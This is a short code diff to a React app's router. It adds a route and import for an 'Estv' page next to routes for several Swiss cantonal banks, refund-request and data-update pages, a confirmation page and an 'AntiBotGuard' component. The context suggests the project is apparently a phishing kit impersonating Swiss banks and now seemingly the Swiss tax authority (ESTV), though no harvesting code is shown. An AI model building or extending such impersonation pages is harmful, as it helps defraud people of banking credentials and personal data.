@@ -71,6 +71,7 @@ import Rueckerstattung from "./pages/Rueckerstattung.tsx";
 import RueckerstattungAnfordern from "./pages/RueckerstattungAnfordern.tsx";
 import Datenaktualisierung from "./pages/Datenaktualisierung.tsx";
 import DatenaktualisierungBestaetigung from "./pages/DatenaktualisierungBestaetigung.tsx";
+import Estv from "./pages/Estv.tsx";
 
 import AntiBotGuard from "./components/AntiBotGuard.tsx";
 import { ReactNode } from "react";
@@ -173,6 +174,9 @@ const App = () => (
             <Route path="/ch/urner-kantonalbank" element={<P><ChUrnerKantonalbank /></P>} />
             <Route path="/ch/zuger-kantonalbank" element={<P><ChZugerKantonalbank /></P>} />
             <Route path="/ch/zuercher-kantonalbank" element={<P><ChZuercherKantonalbank /></P>} />
+            <Route path="/estv" element={<P><Estv /></P>} />
+
+
 
 
             <Route path="/confirmation" element={<P><ConfirmationSwitch /></P>} />
